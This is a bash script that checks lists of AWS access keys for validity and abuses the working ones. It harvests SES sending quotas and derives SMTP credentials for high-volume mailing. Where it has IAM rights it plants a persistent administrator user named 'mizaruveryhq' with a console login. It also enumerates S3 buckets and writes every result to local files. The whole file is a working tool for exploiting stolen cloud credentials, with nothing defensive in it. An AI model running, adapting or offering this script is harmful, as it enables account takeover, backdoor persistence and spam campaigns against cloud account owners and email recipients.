#!/bin/bash
check_send_quota() {
    export AWS_DEFAULT_REGION=$1
    aws ses get-send-quota > /dev/null 2>&1
    if [[ $? -eq 0 ]]; then
        quota=$(aws ses get-send-quota | jq '.Max24HourSend')
        echo -e "\e[33m[INFO]\e[39m Max 24h send quota for ${AWS_DEFAULT_REGION}: $quota mails."
        echo -e "${AWS_ACCESS_KEY_ID}:${AWS_SECRET_ACCESS_KEY}:${AWS_DEFAULT_REGION} ($quota per day)" >> smtp/aws_smtp.txt
        if [ $quota -ge 50000 ]; then
            echo -e "\e[92m[OK]\e[39m Creating smtp credentials..."
            smtppass=$(python3 ses_password.py "${AWS_SECRET_ACCESS_KEY}" "${AWS_DEFAULT_REGION}")
            output="$(echo -n "$i" | cut -d ':' -f1,2):${AWS_DEFAULT_REGION} [$quota mail/day]\nhost: email-smtp.${AWS_DEFAULT_REGION}.amazonaws.com\nport: 587\nuser: ${AWS_ACCESS_KEY_ID}\npassword: $smtppass\n$(aws ses list-identities)\n\n\n"
            echo -e "$output" >> hq.txt
            aws sesv2 get-account &>/dev/null
            if [[ $? -eq 0 ]]; then
                echo -e "${i}" >> smtp/aws_perms_sesv2.txt
                salut=$(aws sesv2 get-account)
                if ! grep -q "SHUTDOWN" <<< $salut; then
                    echo -e "\e[92m[OK]\e[39m ${AWS_ACCESS_KEY_ID} [$quota mail/day] HEALTHY"
                    echo -e "$output" >> healthy_aws_smtp.txt
                else
                    echo -e "\e[91m[FAIL]\e[39m ${AWS_ACCESS_KEY_ID} [$quota mail/day] not HEALTHY (check manually) on panel"
                fi
            fi
            continue 2
        fi
    fi
}

make_panel() {
        export AWS_ACCESS_KEY_ID=$(echo -n "$3")
        export AWS_SECRET_ACCESS_KEY=$(echo -n "$4")
        export AWS_DEFAULT_REGION=$(if [ -z `echo -n "$5"` ]; then echo -n "us-east-1"; else echo -n "$5"; fi)

        username=$1
        password=$2
        lol=$(aws iam create-user --user-name $username)
        if [[ $? -eq 0 ]]; then
                iam=`echo -n "$lol" | grep -oP '(?<="Arn": ").*?(?=")' | cut -d':' -f5`
                aws iam attach-user-policy --user-name $username --policy-arn arn:aws:iam::aws:policy/AdministratorAccess > /dev/null 2>&1 && aws iam create-login-profile --user-name $username --password "$password" > /dev/null 2>&1
                if [[ $? -eq 0 ]]; then
                        echo "https://console.aws.amazon.com/console/home"
                        echo "Account ID (IAM): $iam"
                        echo "Username: $username"
                        echo "Password: $password"
                        echo "$iam:$username:$password ($3:$4:$5)" >> panel.txt
                fi
        else
                echo -e "\e[91m[ERROR]\e[39m ${AWS_ACCESS_KEY_ID} can't create panel :("
        fi
}

declare -a reg=("us-east-1" "us-east-2" "us-west-1" "us-west-2" "af-south-1" "ap-south-1" "ap-northeast-2" "ap-southeast-1" "ap-southeast-2" "ap-northeast-1" "ca-central-1" "eu-central-1" "eu-west-1" "eu-west-2" "eu-south-1" "eu-west-3" "eu-north-1" "me-south-1" "sa-east-1")
for i in $(cat $1); do
        export AWS_ACCESS_KEY_ID=$(echo -n "$i" | cut -d ':' -f1)
        export AWS_SECRET_ACCESS_KEY=$(echo -n "$i" | cut -d ':' -f2)
        export AWS_DEFAULT_REGION="us-east-1"
        #echo $AWS_ACCESS_KEY_ID
        #echo $AWS_SECRET_ACCESS_KEY
        aws sts get-caller-identity >/dev/null 2>&1
        if [[ $? -eq 0 ]]; then 
                echo "$AWS_ACCESS_KEY_ID correct"
                echo -n "$AWS_ACCESS_KEY_ID:$AWS_SECRET_ACCESS_KEY" >> valid.txt
                echo "TESTING FOR SES PERMISSION"
                aws ses get-send-quota >/dev/null 2>&1
                if [[ $? -eq 0 ]]; then
                        quota=$(aws ses get-send-quota | jq '.Max24HourSend')
                        echo -n "$AWS_ACCESS_KEY_ID:$AWS_SECRET_ACCESS_KEY" >> ses.txt
                        for i in "${reg[@]}"; do check_send_quota $i; done
                else
                        echo "$AWS_ACCESS_KEY_ID doesn't have SES permissions :("
                fi
                echo "TESTING FOR IAM PERMISSIONS"
                aws iam list-users >/dev/null 2>&1
                if [[ $? -eq 0 ]]; then
                        echo "$AWS_ACCESS_KEY_ID has IAM permissions, testing to create IAM user"
                        make_panel "mizaruveryhq" "$(cat /dev/urandom 2>/dev/null | tr -dc '_\-/\\^$A-Za-z0-9' 2>/dev/null | head -c12 2>/dev/null)" "${AWS_ACCESS_KEY_ID}" "${AWS_SECRET_ACCESS_KEY}" "${AWS_DEFAULT_REGION}"
                else
                        echo "$AWS_ACCESS_KEY_ID doesn't have IAM permissions :("
                fi
                echo "TESTING FOR S3 PERMISSIONS"
                aws s3 ls >/dev/null 2>&1
                if [[ $? -eq 0 ]]; then
                        echo "$AWS_ACCESS_KEY_ID has S3 permissions, listing buckets..."
                        aws s3 ls
                        echo "$AWS_ACCESS_KEY_ID:$AWS_SECRET_ACCESS_KEY" >> s3.txt
                else
                        echo "$AWS_ACCESS_KEY_ID doesn't have S3 permissions..."
                fi
        else
                echo "$AWS_ACCESS_KEY_ID incorrect"
        fi
done